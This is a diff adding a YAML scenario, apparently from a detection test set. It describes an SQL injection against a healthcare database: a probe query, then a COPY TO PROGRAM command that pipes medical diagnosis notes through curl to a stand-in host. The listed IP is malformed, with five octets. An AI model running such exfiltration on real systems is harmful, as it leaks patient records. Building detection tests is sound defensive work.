@@ -1,0 +1,33 @@
+scenario_id: gen_healthcare_00_sql_injection_mal_14m
+family_id: gen_healthcare_00_sql_injection_fam_14
+domain: healthcare
+time_of_day: '23:35'
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: inject
+  role: research_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 8.0
+  events:
+  - step_id: probe
+    sql: SELECT invoice_id, payment_status FROM billing WHERE patient_id = 658039
+      AND (SELECT count(*) FROM medical_records) > 0
+  - step_id: exfil
+    sql: COPY (SELECT diagnosis_notes, diagnosis_code FROM medical_records) TO PROGRAM
+      'curl -sX POST https://clearinghouse-batch.example/ingest -d @-'
+    connects_to:
+      ip: 141.98.11.25.6
+      port: 443
+matched_pair_id: gen_healthcare_00_sql_injection_pair_14
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
